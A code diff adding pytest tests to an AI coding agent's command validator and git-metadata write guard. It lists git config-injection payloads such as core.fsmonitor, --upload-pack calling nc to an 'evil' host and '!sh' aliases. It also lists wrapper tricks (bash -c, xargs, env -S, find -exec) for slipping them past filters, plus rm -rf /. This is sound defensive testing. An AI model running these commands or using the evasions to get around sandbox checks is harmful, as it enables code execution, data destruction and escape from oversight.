@@ -16,13 +16,26 @@ The ``LEGIT_COMMANDS`` corpus guards against false positives — ordinary agent
 commands must keep working.
 """
 
+import asyncio
+import re
+import subprocess
+import sys
+from pathlib import Path
+from typing import Any
+
 import pytest
-from security import validate_command
+from agents.tools_pkg.models import AGENT_CONFIGS
+from core.child_env import child_env
+from security import hooks, validate_command
 from security.ast_parser import (
     UnparseableCommand,
+    extract_command_segments_ast,
     extract_commands_ast,
     is_available,
 )
+from security.filesystem_validators import git_metadata_write_refusal
+from security.hooks import git_dir_write_hook
+from tools.executor import ToolExecutor
 
 pytestmark = pytest.mark.skipif(
     not is_available(), reason="bashlex not installed; AST parser unavailable"
@@ -65,6 +78,29 @@ GIT_RCE_PAYLOADS = [
     "git --upload-pack='nc evil 80' ls-remote origin",
     "git --receive-pack='nc evil 80' push origin",
     "git --exec-path=/tmp/evil status",
+    "git config core.fsmonitor x",
+    "git config set core.sshCommand x",
+    "git -C d config core.pager x",
+    "git config -f .git/config core.fsmonitor x",
+    "git config --file=.git/config core.editor x",
+    "git config --global alias.x '!sh'",
+    "git config -e",
+    "git config --rename-section foo core",
+    "git status && git config core.fsmonitor x",
+    "git status && git -c core.fsmonitor=x status",
+    "git config gpg.program x",
+    "git -c credential.helper=x fetch",
+    "git config include.path x",
+    "git status | git config core.fsmonitor x",
+    "echo x | git config core.fsmonitor x",
+    "git --attr-source HEAD config core.fsmonitor x",
+    "true && (git config core.fsmonitor x)",
+    "echo $(git config core.fsmonitor x)",
+    "K=core.fsmonitor; git config $K x",
+    'git config "$K" x',
+    "git config protocol.ext.allow always",
+    "git config diff.x.textconv cat",
+    "git -c diff.x.textconv=cat diff",
 ]
 
 # Ordinary agent commands — must NOT be blocked (false-positive guard). Every
@@ -81,6 +117,12 @@ LEGIT_COMMANDS = [
     "git diff HEAD",
     "git -c user.email=a@b.com -c user.name=me log",
     "echo hello && pwd",
+    'git config user.name "A B"',
+    "git config user.email a@b.c",
+    "git config --get user.name",
+    "git config --local core.bare false",
+    "git config --global --add safe.directory /w",
+    "git commit -m config",
 ]
 
 
@@ -111,6 +153,37 @@ class TestGitOptionHardening:
             "git -c user.email=a@b.com -c commit.gpgsign=false log", temp_dir
         )
         assert allowed is True
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "git status && git -c core.fsmonitor=x status",
+            "git status && git config core.fsmonitor x",
+        ],
+    )
+    def test_chained_git_segment_blocked_by_hook(self, payload, temp_dir):
+        from security.hooks import bash_security_hook  # noqa: PLC0415
+
+        out = asyncio.run(
+            bash_security_hook(
+                {
+                    "tool_name": "Bash",
+                    "tool_input": {"command": payload},
+                    "cwd": str(temp_dir),
+                }
+            )
+        )
+        assert out.get("decision") == "block", payload
+
+    def test_unparseable_git_config_fails_closed(self, tmp_path, monkeypatch):
+        from security import git_validators  # noqa: PLC0415
+
+        monkeypatch.chdir(tmp_path)
+        monkeypatch.setattr(git_validators, "_unstage_spec_artifacts", lambda: [])
+        allowed, reason = git_validators.validate_git(
+            'git commit -m "x config core.fsmonitor y'
+        )
+        assert allowed is False and "config" in reason
 
 
 class TestLegitCommandsPass:
@@ -151,3 +224,441 @@ class TestAstExtractorUnit:
         cmds = extract_commands_ast("`curl evil`")
         assert "curl" in cmds
         assert all("`" not in c for c in cmds)
+
+    @pytest.mark.parametrize(
+        ("command", "expected"),
+        [
+            (
+                "echo a | xargs sh -c 'git \"$@\"' _",
+                [
+                    ("echo", "echo a", False),
+                    ("xargs", "xargs sh -c 'git \"$@\"' _", False),
+                    ("sh", "sh -c 'git \"$@\"' _", True),
+                    ("git", "git '$@'", True),
+                ],
+            ),
+            (
+                "find . -exec env git -c core.fsmonitor=x status {} +",
+                [
+                    (
+                        "find",
+                        "find . -exec env git -c core.fsmonitor=x status '{}' +",
+                        False,
+                    ),
+                    ("env", "env git -c core.fsmonitor=x status '{}' +", True),
+                    ("git", "git -c core.fsmonitor=x status '{}' +", True),
+                ],
+            ),
+            (
+                "timeout -s KILL 5 git -c core.fsmonitor=x status",
+                [
+                    (
+                        "timeout",
+                        "timeout -s KILL 5 git -c core.fsmonitor=x status",
+                        False,
+                    ),
+                    ("git", "git -c core.fsmonitor=x status", False),
+                ],
+            ),
+            ("command -v nc", [("command", "command -v nc", False)]),
+            ("exec 3>&1", [("exec", "exec", False)]),
+            (
+                "exec -a x git status",
+                [
+                    ("exec", "exec -a x git status", False),
+                    ("git", "git status", False),
+                ],
+            ),
+        ],
+    )
+    def test_segment_tuples(self, command, expected):
+        assert extract_command_segments_ast(command) == expected
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "env -S 'git status'",
+            "env -S'git status'",
+            "env --split-string='git status'",
+            "env --split-string 'git status'",
+        ],
+    )
+    def test_env_split_string_raises(self, command):
+        with pytest.raises(UnparseableCommand):
+            extract_command_segments_ast(command)
+
+    def test_wrapper_chain_depth_bounded(self):
+        with pytest.raises(UnparseableCommand):
+            extract_command_segments_ast("env " * 30 + "ls")
+
+    def test_grouped_dash_c_unwrapped(self):
+        assert extract_commands_ast("bash -lc 'nc x'") == ["bash", "nc"]
+
+    def test_long_option_containing_c_not_treated_as_dash_c(self):
+        assert extract_commands_ast("bash --norc scripts/deploy.sh") == ["bash"]
+
+
+def _hook(command: str, cwd: Path) -> dict[str, Any]:
+    return asyncio.run(
+        hooks.bash_security_hook(
+            {
+                "tool_name": "Bash",
+                "tool_input": {"command": command},
+                "cwd": str(cwd),
+            }
+        )
+    )
+
+
+_FSMON = "core.fsmonitor"
+_XARGS_GIT = "`git` run by xargs"
+_XARGS_FIND = "run by xargs or find -exec"
+_UNSAFE = "could not be safely parsed"
+_NOT_ALLOWED = "is not in the allowed commands"
+
+WRAPPER_REFUSED = [
+    ("command git -c core.fsmonitor=x status", _FSMON),
+    ("exec git -c core.fsmonitor=x status", _FSMON),
+    ("bash -c 'git --upload-pack=/tmp/evil ls-remote x'", "--upload-pack"),
+    ("sh -c 'git --upload-pack=/tmp/evil ls-remote x'", "--upload-pack"),
+    ("bash -c 'git --config-env=core.fsmonitor=FOO status'", _FSMON),
+    ("echo core.fsmonitor x | xargs git config", _XARGS_GIT),
+    ("bash -c 'git -c core.fsmonitor=x status'", _FSMON),
+    ("bash -c \"bash -c 'git -c core.fsmonitor=x status'\"", _FSMON),
+    ("bash -lc 'git -c core.fsmonitor=x status'", _FSMON),
+    ("timeout 5 git -c core.fsmonitor=x status", _FSMON),
+    ("timeout -s KILL 5 git -c core.fsmonitor=x status", _FSMON),
+    ("env timeout 5 git -c core.fsmonitor=x status", _FSMON),
+    ("command exec git -c core.fsmonitor=x status", _FSMON),
+    ("xargs git -c core.fsmonitor=x status", _FSMON),
+    ("echo a | xargs sh -c 'git \"$@\"' _", _XARGS_GIT),
+    ("env -S 'git -c core.fsmonitor=x status'", _UNSAFE),
+    ("command rm -rf /", "rm target '/'"),
+    ("find . | xargs rm", "`rm` run by xargs"),
+    ("find / -exec rm -rf {} +", "`rm` " + _XARGS_FIND),
+    ("find . -name '*.pyc' -exec rm {} \\;", "`rm` " + _XARGS_FIND),
+    ("find /etc -exec chmod 777 {} +", "got: 777"),
+    ("env git -c core.fsmonitor=x status", _FSMON),
+    ("find . -exec git -c core.fsmonitor=x status {} \\;", _FSMON),
+    ('bash -c "$V"', _UNSAFE),
+    ("find . -exec chmod 755 {} +", "`chmod` " + _XARGS_FIND),
+    ("env --split-string='git -c core.fsmonitor=x status'", _UNSAFE),
+    ("env -S'git -c core.fsmonitor=x status'", _UNSAFE),
+    ("timeout -sKILL 5 git -c core.fsmonitor=x status", _FSMON),
+    ("timeout --signal=KILL -k 1 5 git -c core.fsmonitor=x status", _FSMON),
+    ("exec -a x git -c core.fsmonitor=x status", _FSMON),
+    ("sh -ec 'git --upload-pack=/tmp/evil ls-remote x'", "--upload-pack"),
+    ("timeout 60 npm test", "npm"),
+    ("env --s='git -c core.fsmonitor=x status'", _UNSAFE),
+    ("env --spl 'git -c core.fsmonitor=x status'", _UNSAFE),
+    ("env --split 'git -c core.fsmonitor=x status'", _UNSAFE),
+    ("exec -la ls git -c core.fsmonitor=x status", _FSMON),
+    ("exec -cla ls git -c core.fsmonitor=x status", _FSMON),
+    (
+        "echo x | FOO='!touch P' xargs -i git --config-env=alias.ls=FOO ls",
+        "config injection",
+    ),
+    ("xargs -tI ls git -c core.fsmonitor=x status", _UNSAFE),
+    ("xargs --process-slot-var ls git -c core.fsmonitor=x status", _UNSAFE),
+    ("xargs --arg-file /usr/bin/ls git -c core.fsmonitor=x status", _UNSAFE),
+    ("env -u ls git -c core.fsmonitor=x status", _FSMON),
+    ("env -C . git -c core.fsmonitor=x status", _FSMON),
+    ("env --unset ls git -c core.fsmonitor=x status", _FSMON),
+    ("env --chdir . git -c core.fsmonitor=x status", _FSMON),
+    ("env -a x git -c core.fsmonitor=x status", _FSMON),
+    ("env --argv0 x git -c core.fsmonitor=x status", _FSMON),
+    ("env --unse ls git -c core.fsmonitor=x status", _FSMON),
+    # Options end at VAR=val, `--` or a lone `-`: the next word is the command.
+    ("env PATH=.:/usr/bin FOO=1 -C ls", _NOT_ALLOWED),
+    ("env PATH=.:/usr/bin FOO=1 -C -c 'alias.ls=!touch X' ls", _NOT_ALLOWED),
+    ("env - -C ls", _NOT_ALLOWED),
+    ("env -- -u ls", _NOT_ALLOWED),
+    ("echo | xargs -- -C ls", _NOT_ALLOWED),
+    ("exec - ls", _NOT_ALLOWED),
+    ("command - ls", _NOT_ALLOWED),
+    ("command -p - ls", _NOT_ALLOWED),
+]
+
+WRAPPER_ALLOWED = [
+    "command -v git",
+    "find . -name '*.py' | xargs grep foo",
+    "bash -c 'ls && git status'",
+    "bash -lc 'git status'",
+    "exec git status",
+    "timeout 60 git status",
+    "env FOO=1 git status",
+    "find . -name '*.pyc' -delete",
+    "find . -name '*.py' -exec grep -l foo {} +",
+    "git commit -m '...$(x)'",
+    "command -v nc",
+    "timeout -s KILL 5 git status",
+    "exec 3>&1",
+    "env -u FOO ls",
+    "env -C src ls",
+    "xargs -I{} echo {}",
+    "xargs -0 -n1 echo",
+    "env -- FOO=1 ls",
+    "env - ls",
+    "xargs -- echo",
+    "exec -a name ls",
+]
+
+
+class TestWrapperUnwrapRefused:
+    """Validators see the inner command of every wrapper, on both paths."""
+
+    @pytest.mark.parametrize(("command", "reason"), WRAPPER_REFUSED)
+    def test_validate_command_refuses(self, command, reason, temp_dir):
+        ok, r = validate_command(command, temp_dir)
+        assert ok is False and reason in r, (command, r)
+
+    @pytest.mark.parametrize(("command", "reason"), WRAPPER_REFUSED)
+    def test_hook_refuses(self, command, reason, temp_dir):
+        out = _hook(command, temp_dir)
+        assert out.get("decision") == "block" and reason in out["reason"], (
+            command,
+            out,
+        )
+
+
+class TestWrapperUnwrapAllowed:
+    """False-positive guard for the wrapper unwrapping."""
+
+    @pytest.mark.parametrize("command", WRAPPER_ALLOWED)
+    def test_validate_command_allows(self, command, temp_dir):
+        assert validate_command(command, temp_dir) == (True, ""), command
+
+    @pytest.mark.parametrize("command", WRAPPER_ALLOWED)
+    def test_hook_allows(self, command, temp_dir):
+        assert _hook(command, temp_dir) == {}, command
+
+
+def test_bash_c_npm_allowed_in_node_project(node_project):
+    command = "bash -c 'npm test'"
+    assert validate_command(command, node_project) == (True, "")
+    assert _hook(command, node_project) == {}
+
+
+class TestWrapperFallbackWithoutBashlex:
+    """Without bashlex every command is refused (fail closed)."""
+
+    @pytest.fixture(autouse=True)
+    def _no_bashlex(self, monkeypatch):
+        monkeypatch.setattr(hooks, "is_available", lambda: False)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "env git status",
+            "echo a | xargs grep foo",
+            "exec git status",
+            "timeout 5 git status",
+            "watch ls",
+            "command git status",
+            "bash -lc 'ls'",
+            "bash -c 'ls'",
+            "find . -exec ls {} +",
+            "git status && ls",
+            "command -v git",
+            "ls",
+        ],
+    )
+    def test_refused(self, command, temp_dir):
+        ok, r = validate_command(command, temp_dir)
+        assert ok is False and "without bashlex" in r, (command, r)
+
+
+# --- #1719: agent writes into git metadata ---------------------------------
+
+_WRITE_TOOLS = {"Write", "Edit", "MultiEdit", "NotebookEdit", "Bash"}
+_SIMPLE_TYPES = [
+    "commit_message",
+    "merge_resolver",
+    "insights",
+    "batch_analysis",
+    "batch_validation",
+    "spec_compaction",
+]
+
+
+def _git(*args):
+    subprocess.run(["git", *args], env=child_env(), check=True, capture_output=True)
+
+
+@pytest.fixture
+def repo(tmp_path):
+    orig = tmp_path / "orig"
+    wt = tmp_path / "wt"
+    _git("init", "-q", str(orig))
+    _git(
+        "-C", str(orig), "-c", "user.name=t", "-c", "user.email=t@t",
+        "commit", "-q", "--allow-empty", "-m", "init",
+    )  # fmt: skip
+    _git("-C", str(orig), "worktree", "add", "-q", str(wt))
+    (wt / "link").symlink_to(orig / ".git")
+    (tmp_path / "store").mkdir()
+    (tmp_path / "ext").mkdir()
+    (tmp_path / "ext" / ".git").symlink_to(tmp_path / "store")
+    (wt / "a").symlink_to(wt / "b")
+    (wt / "b").symlink_to(wt / "a")
+    return orig, wt
+
+
+def _write_hook(tool, ti, cwd):
+    return asyncio.run(
+        git_dir_write_hook({"tool_name": tool, "tool_input": ti, "cwd": str(cwd)})
+    )
+
+
+def _ti(tool, path):
+    key = "notebook_path" if tool == "NotebookEdit" else "file_path"
+    return {key: str(path)}
+
+
+class TestGitDirWriteGuard:
+    @pytest.mark.parametrize(
+        "case",
+        [
+            "wt_pointer", "abs_config", "hooks", "info", "modules", "dotdot",
+            "symlink_abs", "symlink_rel_cwd", "ext_dotgit_symlink", "upper",
+            "multiedit", "notebook",
+        ],
+    )  # fmt: skip
+    def test_blocked_paths(self, repo, tmp_path, case):
+        orig, wt = repo
+        tool, path, cwd = {
+            "wt_pointer": ("Write", wt / ".git", wt),
+            "abs_config": ("Edit", orig / ".git" / "config", wt),
+            "hooks": ("Write", orig / ".git" / "hooks" / "pre-commit", wt),
+            "info": ("Write", orig / ".git" / "info" / "attributes", wt),
+            "modules": ("Edit", orig / ".git" / "modules" / "x" / "config", wt),
+            "dotdot": ("Write", "src/../.git/config", orig),
+            "symlink_abs": ("Edit", wt / "link" / "config", wt),
+            "symlink_rel_cwd": ("Write", "link/config", wt),
+            "ext_dotgit_symlink": ("Write", tmp_path / "ext" / ".git" / "config", wt),
+            "upper": ("Write", orig / ".GIT" / "config", wt),
+            "multiedit": ("MultiEdit", orig / ".git" / "config", wt),
+            "notebook": ("NotebookEdit", orig / ".git" / "x.ipynb", wt),
+        }[case]  # fmt: skip
+        r = _write_hook(tool, _ti(tool, path), cwd)
+        assert r["decision"] == "block"
+        assert r["reason"]
+
+    @pytest.mark.parametrize(
+        "tool,path",
+        [
+            ("Write", ".gitignore"),
+            ("Write", ".github/workflows/x.yml"),
+            ("Write", "src/git/x.py"),
+            ("Write", "repo.git/readme"),
+            ("NotebookEdit", "nb.ipynb"),
+            ("Read", "ORIG/.git/config"),
+        ],
+    )
+    def test_allowed_paths(self, repo, tool, path):
+        orig, wt = repo
+        if tool == "Read":
+            path = str(orig / ".git" / "config")
+        assert _write_hook(tool, _ti(tool, path), wt) == {}
+
+    @pytest.mark.parametrize(
+        "ti", ["x", {}, {"file_path": 3}, {"file_path": ""}], ids=str
+    )
+    def test_malformed_input_blocked(self, repo, ti):
+        _, wt = repo
+        assert _write_hook("Write", ti, wt)["decision"] == "block"
+
+    @pytest.mark.parametrize("exc", [OSError, RuntimeError, ValueError])
+    def test_resolve_error_refused(self, repo, monkeypatch, exc):
+        _, wt = repo
+
+        def _boom(self, *a, **k):
+            raise exc("x")
+
+        monkeypatch.setattr(Path, "resolve", _boom)
+        assert git_metadata_write_refusal(str(wt / "ok.txt"), str(wt)) is not None
+
+    def test_symlink_loop(self, repo):
+        _, wt = repo
+        r = _write_hook("Write", _ti("Write", wt / "a"), wt)
+        if sys.version_info < (3, 13):
+            assert r["decision"] == "block"
+
+    def test_block_log_has_no_path(self, repo, caplog):
+        orig, wt = repo
+        with caplog.at_level("WARNING"):
+            _write_hook("Write", _ti("Write", orig / ".git" / "config"), wt)
+        assert "Blocked agent write" in caplog.text
+        assert str(orig) not in caplog.text
+
+    def test_executor_write_refused(self, repo):
+        orig, _ = repo
+        cfg = orig / ".git" / "config"
+        before = cfg.read_bytes()
+        res = asyncio.run(
+            ToolExecutor(working_dir=orig).execute(
+                "Write", {"file_path": ".git/config", "content": "x"}
+            )
+        )
+        assert res.is_error
+        assert cfg.read_bytes() == before
+
+    def test_executor_edit_refused(self, repo):
+        orig, _ = repo
+        cfg = orig / ".git" / "config"
+        before = cfg.read_bytes()
+        res = asyncio.run(
+            ToolExecutor(working_dir=orig).execute(
+                "Edit",
+                {"file_path": ".git/config", "old_string": "[core]", "new_string": "x"},
+            )
+        )
+        assert res.is_error
+        assert cfg.read_bytes() == before
+
+    def test_matcher_covers_write_tools(self):
+        src = (
+            Path(__file__).resolve().parents[1] / "apps/backend/core/client.py"
+        ).read_text()
+        m = re.search(
+            r'HookMatcher\(\s*matcher="([^"]+)",\s*hooks=\[git_dir_write_hook\]', src
+        )
+        assert m
+        for t in ("Write", "Edit", "MultiEdit", "NotebookEdit"):
+            assert re.fullmatch(m.group(1), t)
+        for t in ("Read", "Bash"):
+            assert not re.fullmatch(m.group(1), t)
+
+    def test_notebook_path_checked_when_file_path_also_sent(self, repo):
+        orig, wt = repo
+        ti = {
+            "file_path": str(wt / "ok.ipynb"),
+            "notebook_path": str(orig / ".git" / "x.ipynb"),
+        }
+        assert _write_hook("NotebookEdit", ti, wt).get("decision") == "block"
+
+    @pytest.mark.parametrize("agent_type", _SIMPLE_TYPES)
+    def test_simple_client_types_have_no_write_tools(self, agent_type):
+        """Callers of simple_client (#1719 NOTE-B): commit_message,
+        merge_resolver, insights, batch_analysis, batch_validation,
+        spec_compaction. simple_client has no hooks, so none may list writes."""
+        assert not _WRITE_TOOLS & set(AGENT_CONFIGS[agent_type]["tools"])
+
+    @pytest.mark.parametrize("agent_type", _SIMPLE_TYPES)
+    def test_simple_client_options_disallow_write_tools(self, agent_type, monkeypatch):
+        from core import simple_client
+
+        seen = {}
+
+        def _capture(**kw):
+            seen["options"] = kw["options"]
+            return object()
+
+        monkeypatch.setenv("CLAUDE_CODE_OAUTH_TOKEN", "tok")
+        monkeypatch.setattr(simple_client, "require_auth_token", lambda: "tok")
+        monkeypatch.setattr(simple_client, "ClaudeSDKClient", _capture)
+        monkeypatch.setattr(simple_client, "wrap_client_outbound_scrub", lambda c: c)
+        simple_client.create_simple_client(
+            agent_type=agent_type, model="claude-haiku-4-5"
+        )
+        assert _WRITE_TOOLS <= set(seen["options"].disallowed_tools)
